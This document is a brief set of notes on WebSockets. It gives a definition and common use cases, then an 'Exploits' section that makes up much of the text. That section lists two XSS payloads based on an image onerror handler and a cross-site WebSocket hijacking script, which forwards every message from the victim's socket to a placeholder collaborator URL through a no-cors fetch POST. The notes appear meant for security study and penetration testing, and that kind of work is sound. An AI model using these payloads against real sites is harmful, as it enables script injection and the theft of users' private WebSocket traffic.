1.  Websockets are initiated over HTTP and provide long-lived connections with asynchronous (Client does not wait for the responce unlike HTTP) communication in both directions.
2.  Use cases:  
    * Chat apps,  
    * video and voice calls,  
    * online gaming,  
    * live streaming,  
    * real-time updates,  
    * collaborative editing, and other applications that require instant message delivery.  
3. Exploits:   

```
<img src=1 onerror='alert(1)'>
```  
```  
{"message":"<img src=42 OnERroR=alert`42`>"}
```  

```
<script>
// Create a new WebSocket object and connect to the specified URL
var ws = new WebSocket('wss://your-websocket-url');

// Set an event listener for when the connection is opened
ws.onopen = function() {
// Send a message to the server indicating that the client is ready to receive messages
ws.send("READY");
};

// Set an event listener for when a message is received from the server
ws.onmessage = function(event) {
// Send the received message data as the request body in an HTTP POST request to the specified collaborator URL
// Note that the 'no-cors' mode is used to bypass CORS checks
fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data});
};
</script>
```
